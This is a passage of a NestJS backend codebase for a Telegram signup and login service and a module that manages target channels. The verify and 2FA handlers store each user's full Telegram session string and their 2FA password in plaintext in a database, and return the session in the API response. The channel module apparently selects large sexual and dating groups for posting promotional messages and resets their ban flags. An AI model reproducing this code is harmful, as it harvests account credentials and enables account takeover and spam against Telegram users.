required',\r\n                            requires2FA: true\r\n                        };\r\n                    }\r\n                    return await this.handle2FALogin(phone, session.client, password);\r\n                }\r\n                if (error.errorMessage?.includes('PHONE_CODE_INVALID') ||\r\n                    error.errorMessage?.includes('PHONE_CODE_EXPIRED')) {\r\n                    throw new BadRequestException('Invalid OTP,  Try again!');\r\n                }\r\n\r\n                this.logger.warn(`Verification attempt failed for ${phone}: ${error.message}`);\r\n                throw new BadRequestException('Verification failed. Please try again.');\r\n            }\r\n        } catch (error) {\r\n            this.logger.error(`Verification error for ${phone}: ${error.message}`);\r\n\r\n            if (error.message?.includes('No active signup session') ||\r\n                error.message?.includes('Connection failed')) {\r\n                await this.disconnectClient(phone);\r\n            }\r\n\r\n            throw error instanceof BadRequestException ? error :\r\n                new BadRequestException(error.message || 'Verification failed, please try again');\r\n        }\r\n    }\r\n\r\n    private async handle2FALogin(phone: string, client: TelegramClient, password: string): Promise<TgSignupResponse> {\r\n        try {\r\n            this.logger.debug(`Fetching password SRP parameters for ${phone}`);\r\n            const passwordSrpResult = await client.invoke(new Api.account.GetPassword());\r\n\r\n            this.logger.debug(`Computing password check for ${phone}`);\r\n            const passwordCheck = await computeCheck(passwordSrpResult, password);\r\n\r\n            this.logger.debug(`Invoking CheckPassword API for ${phone}`);\r\n            const signInResult = await client.invoke(\r\n                new Api.auth.CheckPassword({\r\n                    password: passwordCheck,\r\n                })\r\n            ) as Api.auth.Authorization;\r\n\r\n            if (!signInResult || !signInResult.user) {\r\n                throw new BadRequestException('Invalid response from Telegram server');\r\n            }\r\n\r\n            this.logger.log(`2FA login successful for ${phone}`);\r\n            const sessionString = client.session.save() as unknown as string;\r\n            if (!sessionString) {\r\n                throw new Error('Failed to generate session string');\r\n            }\r\n\r\n            const userData = await this.processLoginResult(signInResult.user, sessionString, password);\r\n            await this.disconnectClient(phone);\r\n            return userData;\r\n        } catch (error) {\r\n            this.logger.error(`2FA login failed for ${phone}: ${error.message}`, error.stack);\r\n            if (password) {\r\n                throw new BadRequestException('Incorrect 2FA password');\r\n            }\r\n            throw new BadRequestException('2FA password required');\r\n        }\r\n    }\r\n\r\n    private async handleNewUserRegistration(\r\n        phone: string,\r\n        client: TelegramClient,\r\n        phoneCodeHash: string\r\n    ): Promise<TgSignupResponse> {\r\n        try {\r\n            const randomName = `User${Math.random().toString(36).substring(2, 8)}`;\r\n            const signUpResult = await client.invoke(\r\n                new Api.auth.SignUp({\r\n                    phoneNumber: phone,\r\n                    phoneCodeHash,\r\n                    firstName: randomName,\r\n                    lastName: '', // Keep empty for privacy\r\n                })\r\n            ) as Api.auth.Authorization;\r\n\r\n            if (!signUpResult || !signUpResult.user) {\r\n                throw new BadRequestException('Invalid response from Telegram server');\r\n            }\r\n\r\n            const sessionString = client.session.save() as unknown as string;\r\n            if (!sessionString) {\r\n                throw new Error('Failed to generate session string');\r\n            }\r\n\r\n            return await this.processLoginResult(signUpResult.user, sessionString);\r\n        } catch (error) {\r\n            const errorDetails = parseError(error, \"TGSIGNUP\", false);\r\n            this.logger.error(`Failed to register new user: ${errorDetails.message}`);\r\n            throw new BadRequestException(errorDetails.message || 'Failed to register new user');\r\n        }\r\n    }\r\n\r\n    private async processLoginResult(user: any, sessionString: string, password?: string): Promise<TgSignupResponse> {\r\n        try {\r\n            if (!user || !sessionString) {\r\n                throw new Error('Invalid user data or session string');\r\n            }\r\n\r\n            // Add additional user metadata\r\n            const now = new Date();\r\n            const userData: CreateUserDto = {\r\n                mobile: user.phone?.toString()?.replace(/^\\+/, '') || '',\r\n                session: sessionString,\r\n                firstName: user.firstName || '',\r\n                lastName: user.lastName || '',\r\n                username: user.username || '',\r\n                tgId: user.id?.toString() || '',\r\n                twoFA: !!password,\r\n                password: password || null,\r\n                lastActive: now.toISOString().split('T')[0],\r\n                expired: false,\r\n                channels: 0,\r\n                personalChats: 0,\r\n                totalChats: 0,\r\n                otherPhotoCount: 0,\r\n                ownPhotoCount: 0,\r\n                ownVideoCount: 0,\r\n                otherVideoCount: 0,\r\n                recentUsers: [],\r\n                calls: {\r\n                    chatCallCounts: [],\r\n                    incoming: 0,\r\n                    outgoing: 0,\r\n                    totalCalls: 0,\r\n                    video: 0,\r\n                },\r\n                contacts: 0,\r\n                movieCount: 0,\r\n                msgs: 0,\r\n                photoCount: 0,\r\n                videoCount: 0,\r\n                gender: 'unknown',\r\n            };\r\n\r\n            // Validate required fields\r\n            if (!userData.mobile || !userData.tgId) {\r\n                throw new Error('Invalid user data received from Telegram');\r\n            }\r\n\r\n            await this.usersService.create(userData);\r\n            return {\r\n                status: 200,\r\n                message: 'Registration successful',\r\n                session: sessionString,\r\n            };\r\n        } catch (error) {\r\n            this.logger.error('Error processing login result:', error);\r\n            if (error instanceof BadRequestException) {\r\n                throw error;\r\n            }\r\n            throw new InternalServerErrorException('Failed to complete registration');\r\n        }\r\n    }\r\n}\r\n","import { ApiProperty } from '@nestjs/swagger';\r\nimport { Transform } from 'class-transformer';\r\nimport { IsString, IsNotEmpty, IsOptional, Matches, MinLength } from 'class-validator';\r\n\r\nexport class SendCodeDto {\r\n    @ApiProperty({\r\n        description: 'Phone number to send the verification code to (international format)',\r\n        example: '+919876543210'\r\n    })\r\n    @IsString()\r\n    @IsNotEmpty()\r\n    @Matches(/^\\+\\d{8,15}$/, { message: 'Invalid phone number format' })\r\n    phone: string;\r\n}\r\n\r\nexport class VerifyCodeDto {\r\n    @ApiProperty({\r\n        description: 'Phone number used for verification (international format)',\r\n        example: '919876543210'\r\n    })\r\n    @IsString()\r\n    @IsNotEmpty()\r\n    @Matches(/^\\+\\d{8,15}$/, { message: 'Invalid phone number format' })\r\n    phone: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Verification code received',\r\n        example: '12345'\r\n    })\r\n    @IsString()\r\n    @IsNotEmpty()\r\n    @Matches(/^\\d{5}$/, { message: 'Code must be exactly 5 digits' })\r\n    code: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Two-factor authentication password if required',\r\n        example: 'yourSecurePassword123',\r\n        required: false\r\n    })\r\n    @IsString()\r\n    @IsOptional()\r\n    @Transform(({ value }) => value === '' ? undefined : value)\r\n    password?: string | undefined;\r\n\r\n}\r\n\r\nexport class TgSignupResponse {\r\n    @ApiProperty({\r\n        description: 'Operation status code',\r\n        example: 200\r\n    })\r\n    status: number;\r\n\r\n    @ApiProperty({\r\n        description: 'Response message',\r\n        example: 'Login successful'\r\n    })\r\n    message: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Phone code hash for verification',\r\n        example: 'abc123xyz',\r\n        required: false\r\n    })\r\n    phoneCodeHash?: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Whether the code was sent via app',\r\n        example: true,\r\n        required: false\r\n    })\r\n    isCodeViaApp?: boolean;\r\n\r\n    @ApiProperty({\r\n        description: 'Session string for authenticated client',\r\n        required: false\r\n    })\r\n    session?: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Whether 2FA is required',\r\n        example: false,\r\n        required: false\r\n    })\r\n    requires2FA?: boolean;\r\n}","import { Controller, Post, Body, Logger, HttpStatus } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiResponse, ApiExtraModels } from '@nestjs/swagger';\r\nimport { TgSignupService } from './TgSignup.service';\r\nimport { SendCodeDto, VerifyCodeDto, TgSignupResponse } from './dto/tg-signup.dto';\r\nimport { parseError } from '../../utils/parseError';\r\n\r\n@Controller('tgsignup')\r\n@ApiTags('tgsignup')\r\n@ApiExtraModels(SendCodeDto, VerifyCodeDto, TgSignupResponse)\r\nexport class TgSignupController {\r\n    private readonly logger = new Logger(TgSignupController.name);\r\n\r\n    constructor(private readonly tgSignupService: TgSignupService) {}\r\n\r\n    @Post('send-code')\r\n    @ApiOperation({\r\n        summary: 'Send verification code to phone number',\r\n        description: 'Initiates the signup process by sending a verification code via Telegram'\r\n    })\r\n    @ApiResponse({\r\n        status: HttpStatus.CREATED,\r\n        type: TgSignupResponse,\r\n        description: 'Code sent successfully'\r\n    })\r\n    @ApiResponse({\r\n        status: HttpStatus.BAD_REQUEST,\r\n        description: 'Invalid phone number or failed to send code',\r\n        schema: {\r\n            type: 'object',\r\n            properties: {\r\n                statusCode: { type: 'number', example: 400 },\r\n                message: { type: 'string', example: 'Invalid phone number format' },\r\n                error: { type: 'string', example: 'Bad Request' }\r\n            }\r\n        }\r\n    })\r\n    @ApiResponse({\r\n        status: HttpStatus.TOO_MANY_REQUESTS,\r\n        description: 'Rate limit exceeded'\r\n    })\r\n    @ApiResponse({\r\n        status: HttpStatus.INTERNAL_SERVER_ERROR,\r\n        description: 'Internal server error occurred'\r\n    })\r\n    async sendCode(@Body() sendCodeDto: SendCodeDto): Promise<TgSignupResponse> {\r\n        try {\r\n            this.logger.debug(`[SEND_CODE] Request received for phone: ${sendCodeDto.phone}`);\r\n            const result = await this.tgSignupService.sendCode(sendCodeDto.phone);\r\n\r\n            return {\r\n                status: HttpStatus.CREATED,\r\n                message: 'Code sent to your Telegram App',\r\n                phoneCodeHash: result.phoneCodeHash,\r\n                isCodeViaApp: result.isCodeViaApp\r\n            };\r\n        } catch (error) {\r\n            this.logger.error(`[SEND_CODE] Error for phone: ${sendCodeDto.phone}`, {\r\n                error,\r\n                stack: error.stack\r\n            });\r\n\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    @Post('verify')\r\n    @ApiOperation({\r\n        summary: 'Verify code and complete signup/login',\r\n        description: 'Verifies the code sent to phone and completes the signup/login process'\r\n    })\r\n    @ApiResponse({\r\n        status: HttpStatus.OK,\r\n        type: TgSignupResponse,\r\n        description: 'Verification successful'\r\n    })\r\n    @ApiResponse({\r\n        status: HttpStatus.BAD_REQUEST,\r\n        description: 'Invalid code or verification failed'\r\n    })\r\n    @ApiResponse({\r\n        status: HttpStatus.TOO_MANY_REQUESTS,\r\n        description: 'Rate limit exceeded'\r\n    })\r\n    @ApiResponse({\r\n        status: HttpStatus.INTERNAL_SERVER_ERROR,\r\n        description: 'Internal server error occurred'\r\n    })\r\n    async verifyCode(@Body() verifyCodeDto: VerifyCodeDto): Promise<TgSignupResponse> {\r\n        try {\r\n            this.logger.debug(`[VERIFY_CODE] Request received for phone: ${verifyCodeDto.phone}`);\r\n\r\n            const result = await this.tgSignupService.verifyCode(\r\n                verifyCodeDto.phone,\r\n                verifyCodeDto.code,\r\n                verifyCodeDto.password\r\n            );\r\n\r\n            return {\r\n                status: result.requires2FA ? HttpStatus.BAD_REQUEST : HttpStatus.OK,\r\n                message: result.message || 'Successfully logged in',\r\n                session: result.session,\r\n                requires2FA: result.requires2FA\r\n            };\r\n        } catch (error) {\r\n            this.logger.error(`[VERIFY_CODE] Error for phone: ${verifyCodeDto.phone}`, {\r\n                error,\r\n                stack: error.stack\r\n            });\r\n\r\n            throw error;\r\n        }\r\n    }\r\n}\r\n","// src/activechannels/activechannels.controller.ts\nimport { Controller, Get, Post, Body, Patch, Param, Delete, NotFoundException, Query, BadRequestException } from '@nestjs/common';\nimport { ActiveChannelsService } from './active-channels.service';\nimport { CreateActiveChannelDto } from './dto/create-active-channel.dto';\nimport { UpdateActiveChannelDto } from './dto/update-active-channel.dto';\nimport { ApiTags, ApiOperation, ApiResponse, ApiQuery, ApiBody } from '@nestjs/swagger';\nimport { ActiveChannel } from './schemas/active-channel.schema';\nimport { AddReactionDto } from './dto/add-reaction.dto';\n\n@ApiTags('Active Channels')\n@Controller('active-channels')\nexport class ActiveChannelsController {\n  constructor(private readonly activeChannelsService: ActiveChannelsService) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create a new active channel' })\n  async create(@Body() createActiveChannelDto: CreateActiveChannelDto) {\n    return this.activeChannelsService.create(createActiveChannelDto);\n  }\n\n  @Post('createMultiple')\n  @ApiOperation({ summary: 'Create multiple channels' })\n  @ApiBody({ type: [CreateActiveChannelDto] })\n  async createMultiple(@Body() createChannelDtos: CreateActiveChannelDto[]): Promise<string> {\n    return this.activeChannelsService.createMultiple(createChannelDtos);\n  }\n\n  @Get('search')\n  @ApiOperation({ summary: 'Search channels by filters' })\n  @ApiQuery({ name: 'channelId', required: false, type: String })\n  @ApiQuery({ name: 'broadcast', required: false, type: Boolean })\n  @ApiQuery({ name: 'canSendMsgs', required: false, type: Boolean })\n  @ApiQuery({ name: 'participantsCount', required: false, type: Number })\n  @ApiQuery({ name: 'restricted', required: false, type: Boolean })\n  @ApiQuery({ name: 'sendMessages', required: false, type: Boolean })\n  @ApiQuery({ name: 'title', required: false, type: String })\n  @ApiQuery({ name: 'username', required: false, type: String })\n  @ApiQuery({ name: 'wordRestriction', required: false, type: Number })\n  @ApiQuery({ name: 'dMRestriction', required: false, type: Number })\n  @ApiQuery({ name: 'availableMsgs', required: false, type: [String] })\n  @ApiQuery({ name: 'reactions', required: false, type: [String] })\n  @ApiQuery({ name: 'banned', required: false, type: Boolean })\n  @ApiQuery({ name: 'reactRestricted', required: false, type: Boolean })\n  @ApiQuery({ name: 'megagroup', required: false, type: Boolean })\n  search(@Query() query: any): Promise<ActiveChannel[]> {\n    return this.activeChannelsService.search(query);\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all active channels' })\n  async findAll() {\n    return this.activeChannelsService.findAll();\n  }\n\n  @Get(':channelId')\n  @ApiOperation({ summary: 'Get an active channel by channelId' })\n  //@apiresponse({ status: 200, description: 'Return the active channel', type: ActiveChannel })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async findOne(@Param('channelId') channelId: string) {\n    return this.activeChannelsService.findOne(channelId);\n  }\n\n  @Patch(':channelId')\n  @ApiOperation({ summary: 'Update an active channel by channelId' })\n  //@apiresponse({ status: 200, description: 'The channel has been successfully updated.', type: ActiveChannel })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async update(@Param('channelId') channelId: string, @Body() updateActiveChannelDto: UpdateActiveChannelDto) {\n    return this.activeChannelsService.update(channelId, updateActiveChannelDto);\n  }\n\n  @Delete(':channelId')\n  @ApiOperation({ summary: 'Delete an active channel by channelId' })\n  //@apiresponse({ status: 200, description: 'The channel has been successfully deleted.' })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async remove(@Param('channelId') channelId: string) {\n    return this.activeChannelsService.remove(channelId);\n  }\n\n  @Post(':channelId/reactions')\n  @ApiOperation({ summary: 'Add reaction to chat group' })\n  addReaction(@Param('channelId') channelId: string, @Body() addReactionDto: AddReactionDto): Promise<ActiveChannel> {\n    if (!addReactionDto.reactions) {\n      throw new BadRequestException('Reaction is required');\n    }\n    return this.activeChannelsService.addReactions(channelId, addReactionDto.reactions);\n  }\n\n  @Get(':channelId/reactions/random')\n  @ApiOperation({ summary: 'Get a random reaction from chat group' })\n  getRandomReaction(@Param('channelId') channelId: string): Promise<string> {\n    return this.activeChannelsService.getRandomReaction(channelId);\n  }\n\n  @Delete(':channelId/reactions')\n  @ApiOperation({ summary: 'Remove reaction from chat group' })\n  removeReaction(@Param('channelId') channelId: string, @Body() addReactionDto: AddReactionDto): Promise<ActiveChannel> {\n    if (!addReactionDto.reactions) {\n      throw new BadRequestException('Reaction is required');\n    }\n    return this.activeChannelsService.removeReaction(channelId, addReactionDto.reactions[0]);\n  }\n}\n","// src/activechannels/activechannels.module.ts\nimport { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { ActiveChannelsService } from './active-channels.service';\nimport { ActiveChannelsController } from './active-channels.controller';\nimport { ActiveChannel, ActiveChannelSchema } from './schemas/active-channel.schema';\nimport { initModule } from '../ConfigurationInit/init.module';\nimport { PromoteMsgModule } from '../promote-msgs/promote-msgs.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ name: ActiveChannel.name, schema: ActiveChannelSchema }]),\n    PromoteMsgModule\n  ],\n  controllers: [ActiveChannelsController],\n  providers: [ActiveChannelsService],\n  exports: [ActiveChannelsService]\n})\nexport class ActiveChannelsModule { }\n","import { PromoteMsgsService } from './../promote-msgs/promote-msgs.service';\n// src/activechannels/activechannels.service.ts\nimport { BadRequestException, Inject, Injectable, InternalServerErrorException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateActiveChannelDto } from './dto/create-active-channel.dto';\nimport { UpdateActiveChannelDto } from './dto/update-active-channel.dto';\nimport { ActiveChannel, ActiveChannelDocument } from './schemas/active-channel.schema';\nimport { parseError } from '../../utils/parseError';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\n\n@Injectable()\nexport class ActiveChannelsService {\n  constructor(\n    @InjectModel(ActiveChannel.name) private activeChannelModel: Model<ActiveChannelDocument>,\n    @Inject(forwardRef(() => PromoteMsgsService))\n    private promoteMsgsService: PromoteMsgsService\n  ) {}\n\n  async create(createActiveChannelDto: CreateActiveChannelDto): Promise<ActiveChannel> {\n    createActiveChannelDto.availableMsgs = Object.keys(await this.promoteMsgsService.findOne())\n    const createdChannel = new this.activeChannelModel(createActiveChannelDto);\n    return createdChannel.save();\n  }\n\n  \n  async createMultiple(createChannelDtos: CreateActiveChannelDto[]): Promise<string> {\n    const bulkOps = createChannelDtos.map((dto) => ({\n      updateOne: {\n        filter: { channelId: dto.channelId },\n        update: { $set: dto },\n        upsert: true\n      }\n    }));\n\n    await this.activeChannelModel.bulkWrite(bulkOps, { ordered: false });\n    return 'Channels Saved';\n  }\n\n  async findAll(): Promise<ActiveChannel[]> {\n    return this.activeChannelModel.find().exec();\n  }\n\n  async findOne(channelId: string): Promise<ActiveChannel> {\n    const channel = (await this.activeChannelModel.findOne({ channelId }).exec())?.toJSON();\n    return channel;\n  }\n\n  async update(channelId: string, updateActiveChannelDto: UpdateActiveChannelDto): Promise<ActiveChannel> {\n    delete updateActiveChannelDto[\"_id\"]\n    const updatedChannel = await this.activeChannelModel.findOneAndUpdate(\n      { channelId },\n      { $set: updateActiveChannelDto },\n      { new: true, upsert: true },\n    ).exec();\n    return updatedChannel;\n  }\n\n  async removeFromAvailableMsgs(channelId: string, msg: string) {\n    return await this.activeChannelModel.findOneAndUpdate({ channelId }, { $pull: { availableMsgs: msg } })\n  }\n\n  async addToAvailableMsgs(channelId: string, msg: string) {\n    return await this.activeChannelModel.findOneAndUpdate({ channelId }, { $addToSet: { availableMsgs: msg } })\n  }\n\n  async remove(channelId: string): Promise<void> {\n    const result = await this.activeChannelModel.findOneAndDelete({ channelId }).exec();\n  }\n\n  async search(filter: any): Promise<ActiveChannel[]> {\n    console.log(filter)\n    return this.activeChannelModel.find(filter).exec();\n  }\n\n  async addReactions(channelId: string, reactions: string[]): Promise<ActiveChannel> {\n    const channel = await this.activeChannelModel.findOneAndUpdate({ channelId }, {\n      $addToSet: { reactions: reactions }\n    })\n    return channel;\n  }\n\n  async getRandomReaction(channelId: string): Promise<string> {\n    const channel = (await this.activeChannelModel.findOne({ channelId }).exec())?.toJSON();\n    if (!channel) {\n      return undefined;\n    }\n    if (channel.reactions.length === 0) {\n      return undefined;\n    }\n    const randomIndex = Math.floor(Math.random() * channel.reactions.length);\n    return channel.reactions[randomIndex];\n  }\n\n  async removeReaction(channelId: string, reaction: string): Promise<ActiveChannel> {\n    const channel = await this.activeChannelModel.findOneAndUpdate({ channelId }, {\n      $pull: { reactions: reaction },\n    })\n    return channel;\n  }\n\n  async getActiveChannels(limit = 50, skip = 0, notIds = []) {\n    const query = {\n      '$and':\n        [\n          {\n            '$or':\n              [\n                { title: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },\n                { username: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },\n              ]\n          },\n          {\n            '$or': [\n              { title: { '$not': { '$regex': /online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },\n              { username: { '$not': { '$regex': /online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },\n            ]\n          },\n          {\n            channelId: { '$nin': notIds },\n            participantsCount: { $gt: 600 },\n            username: {$ne: null},\n            canSendMsgs: true,\n            restricted: false,\n            forbidden: false\n          }\n        ]\n    }\n\n    const sort: Record<string, 1 | -1> = { participantsCount: -1 }\n    try {\n      const result: ActiveChannel[] = await this.activeChannelModel.aggregate([\n        { $match: query },\n        { $skip: skip },\n        { $limit: limit },\n        { $sort: sort }, // Sort by the random field\n        { $project: { randomField: 0 } } // Remove the random field from the output\n      ]).exec();\n      return result;\n    } catch (error) {\n      console.error('Error:', error);\n      return [];\n    }\n  }\n  async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<ActiveChannel[]> {\n    try {\n      if (!query) {\n        throw new BadRequestException('Query is invalid.');\n      }\n      const queryExec = this.activeChannelModel.find(query);\n\n      if (sort) {\n        queryExec.sort(sort);\n      }\n\n      if (limit) {\n        queryExec.limit(limit);\n      }\n\n      if (skip) {\n        queryExec.skip(skip);\n      }\n\n      return await queryExec.exec();\n    } catch (error) {\n      throw new InternalServerErrorException(error.message);\n    }\n  }\n\n  async resetWordRestrictions() {\n    await fetchWithTimeout(`${notifbot()}&text=Request Received for Reset Available Msgs`);\n    try {\n      await this.activeChannelModel.updateMany({\n        banned: false\n      }, {\n        $set: {\n          \"wordRestriction\": 0,\n          \"dMRestriction\": 0\n        }\n      })\n    } catch (e) {\n      console.log(parseError(e))\n    }\n  }\n\n  async resetAvailableMsgs() {\n    await fetchWithTimeout(`${notifbot()}&text=Request Received for Reset Available Msgs`);\n    try {\n      const data = await this.promoteMsgsService.findOne();\n      const keys = Object.keys(data);\n      await this.activeChannelModel.updateMany(\n        {\n          $expr: {\n            $lt: [{ $size: { $ifNull: [\"$availableMsgs\", []] } }, 5]\n          }\n        },\n        {\n          $set: {\n            \"wordRestriction\": 0,\n            \"dMRestriction\": 0,\n            \"banned\": false,\n            \"availableMsgs\": keys\n          }\n        }\n      );\n    } catch (e) {\n      console.log(parseError(e))\n    }\n  }\n\n  async updateBannedChannels() {\n    await fetchWithTimeout(`${notifbot()}&text=Request Received for update banned Channels`);\n    await this.activeChannelModel.updateMany({ $or: [{ banned: true }, { private: true }] }, {\n      $set: {\n        \"wordRestriction\": 0,\n        \"dMRestriction\": 0,\n        banned: false,\n        \"private\": false\n      }\n    })\n  }\n\n  async updateDefaultReactions() {\n    await this.activeChannelModel.updateMany({}, {\n      $set: {\n        reactions: [\n          '', '', '', '', '', '',\n          '', '', '', '', '', '',\n          '', '', '', '', '', '',\n          '', '', '', '', '', '',\n          '', '', '', '', '', '',\n          '', '', '', '', '', '',\n          '', '', '', '', '',\n          '', '', '', '', ''\n        ]\n      }\n    })\n  }\n}\n","import { ApiProperty,  } from '@nestjs/swagger';\n\nexport class AddReactionDto  {\n    @ApiProperty({required: true})\n    reactions: string[]\n}\n","// src/activechannels/dto/create-activechannel.dto.ts\nimport { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateActiveChannelDto {\n  @ApiProperty()\n  channelId: string;\n\n  @ApiProperty({ default: false })\n  broadcast: boolean;\n\n  @ApiProperty({ default: true })\n  canSendMsgs: boolean;\n\n  @ApiProperty({ default: 300 })\n  participantsCount: number;\n\n  @ApiProperty({ default: false })\n  restricted: boolean;\n\n  @ApiProperty({ default: true })\n  sendMessages: boolean;\n\n  @ApiProperty({ default: false })\n  reactRestricted?: boolean = false;\n\n  @ApiProperty()\n  title: string;\n\n  @ApiProperty()\n  username: string;\n\n  @ApiProperty({ default: 0 })\n  wordRestriction?: number = 0;\n\n  @ApiProperty({ default: 0 })\n  dMRestriction?: number = 0;\n\n  @ApiProperty({ type: [String] })\n  availableMsgs?: string[];\n\n  @ApiProperty({\n    type: [String], default: [\n      '', '', '', '', '', '',\n      '', '', '', '', '', '',\n      '', '', '', '', '', '',\n      '', '', '', '', '', '',\n      '', '', '', '', '', '',\n      '', '', '', '', '', '',\n      '', '', '', '', '',\n      '', '', '', '', ''\n    ]\n  })\n  reactions?: string[] = [\n    '', '', '', '', '', '',\n    '', '', '', '', '', '',\n    '', '', '', '', '', '',\n    '', '', '', '', '', '',\n    '', '', '', '', '', '',\n    '', '', '', '', '', '',\n    '', '', '', '', '',\n    '', '', '', '', ''\n  ];\n\n  @ApiProperty({ default: false })\n  banned?: boolean = false;\n\n  @ApiProperty({ default: true, required: false })\n  megagroup?: boolean;\n\n  @ApiProperty({ default: false, required: false })\n  forbidden?: boolean\n\n  @ApiProperty({\n    description: 'Whether the channel is private',\n    example: false,\n    required: false,\n  })\n  private: boolean = false;\n}\n","// src/activechannels/dto/update-activechannel.dto.ts\nimport { PartialType } from '@nestjs/swagger';\nimport { CreateActiveChannelDto } from './create-active-channel.dto';\n\nexport class UpdateActiveChannelDto extends PartialType(CreateActiveChannelDto) {}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\nimport * as mongoose from 'mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { defaultMessages, defaultReactions } from '../../../utils';\n\nexport type ActiveChannelDocument = ActiveChannel & Document;\n\n@Schema({ collection: 'activeChannels', versionKey: false, autoIndex: true,\n  timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n })\nexport class ActiveChannel {\n  @ApiProperty({ required: true })\n  @Prop({ required: true, unique: true })\n  channelId: string;\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  broadcast: boolean;\n\n  @ApiProperty({ default: true })\n  @Prop({ default: true })\n  canSendMsgs: boolean;\n\n  @ApiProperty({ type: Number, default: 0 })\n  @Prop({ type: mongoose.Schema.Types.Number, default: 0 })\n  participantsCount: number;\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  restricted: boolean;\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  sendMessages: boolean;\n\n  @ApiProperty({ required: true })\n  @Prop({ required: true })\n  title: string;\n\n  @ApiProperty({ required: false, default: null })\n  @Prop({ required: false, default: null })\n  username: string;\n\n  @ApiProperty({ type: Number, default: 0 })\n  @Prop({ type: mongoose.Schema.Types.Number, default: 0 })\n  wordRestriction: number;\n\n  @ApiProperty({ type: Number, default: 0 })\n  @Prop({ type: mongoose.Schema.Types.Number, default: 0 })\n  dMRestriction: number;\n\n  @ApiProperty({ type: [String], default:defaultMessages })\n  @Prop({ type: [String], default: defaultMessages })\n  availableMsgs: string[];\n\n  @ApiProperty({ type: [String], default: defaultReactions })\n  @Prop({\n    type: [String], default: defaultReactions\n  })\n  reactions: string[];\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  banned: boolean;\n\n  @ApiProperty({ default: true })\n  @Prop({ default: true })\n  megagroup: boolean;\n\n  @ApiProperty({ default: false})\n  @Prop({ default: false })\n  private: boolean;\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  reactRestricted: boolean\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  forbidden: boolean\n}\n\nexport const ActiveChannelSchema = SchemaFactory.createForClass(ActiveChannel);\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody, ApiQuery } from '@nestjs/swagger';\nimport { Client } from '../clients/schemas/client.schema';\nimport { ArchivedClientService } from './archived-client.service';\nimport { CreateClientDto } from '../clients/dto/create-client.dto';\nimport { SearchClientDto } from '../clients/dto/search-client.dto';\nimport { UpdateClientDto } from '../clients/dto/update-client.dto';\n\n@ApiTags('Archived Clients')\n@Controller('archived-clients')\nexport class ArchivedClientController {\n  constructor(private readonly archivedclientService: ArchivedClientService) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create user data' })\n  //@apiresponse({ status: 201, description: 'The user data has been successfully created.' })\n  //@apiresponse({ status: 403, description: 'Forbidden.' })\n  async create(@Body() createClientDto: CreateClientDto): Promise<Client> {\n    return this.archivedclientService.create(createClientDto);\n  }\n\n  @Get('search')\n  @ApiOperation({ summary: 'Search user data' })\n  @ApiQuery({ name: 'clientId', required: false, description: 'Client ID' })\n  @ApiQuery({ name: 'dbcoll', required: false, description: 'Database collection name' })\n  @ApiQuery({ name: 'channelLink', required: false, description: 'Channel link' })\n  @ApiQuery({ name: 'link', required: false, description: 'Client link' })\n  async search(@Query() query: SearchClientDto): Promise<Client[]> {\n    return this.archivedclientService.search(query);\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all user data' })\n  //@apiresponse({ status: 200, description: 'Return all user data.' })\n  //@apiresponse({ status: 403, description: 'Forbidden.' })\n  async findAll(): Promise<Client[]> {\n    return this.archivedclientService.findAll();\n  }\n  \n  @Get('checkArchivedClients')\n  @ApiOperation({ summary: 'Get user data by ID' })\n  //@apiresponse({ status: 200, description: 'Return the user data.' })\n  //@apiresponse({ status: 404, description: 'User data not 